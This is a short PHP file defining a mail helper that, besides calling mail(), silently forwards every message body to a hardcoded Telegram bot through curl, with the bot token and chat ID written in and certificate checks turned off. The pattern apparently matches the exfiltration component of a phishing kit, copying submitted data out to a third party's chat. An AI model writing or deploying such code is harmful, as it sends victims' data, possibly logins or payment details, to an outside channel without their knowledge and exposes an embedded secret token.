<?php
function _mail($email,$subject,$message) {
    mail($email,$subject,$message);
    t_send(urlencode($message));
}

function t_send($message) {
    $curl = curl_init();
    $api_key  = '1719199532:AAHIHJV0g0xaGjt8CSgT6iIfD80MoR61Y0M';
    $chat_id  = '1707569114';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

?>